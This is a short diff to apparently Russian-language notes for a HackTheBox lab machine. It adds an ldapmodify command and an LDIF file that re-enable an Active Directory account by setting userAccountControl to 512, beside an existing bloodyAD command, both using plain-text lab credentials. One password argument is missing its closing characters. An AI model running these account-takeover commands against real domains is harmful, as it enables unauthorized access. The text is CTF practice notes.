@@ -69,7 +69,15 @@ Silvercore_21
      Изменение атрибута userAccountControl
 
      bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set object adam.silver userAccountControl -v 512
-
+     или ldapmodify -x -H ldap://dc.puppy.htb -D "ant.edwards@puppy.htb" -w "Antman2025 -f mod.ldap 
+     
+     (где mod.ldap
+     
+     dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+     changetype: modify
+     replace: userAccountControl
+     userAccountControl: 512
+     )
 
 # WriteOwner
 
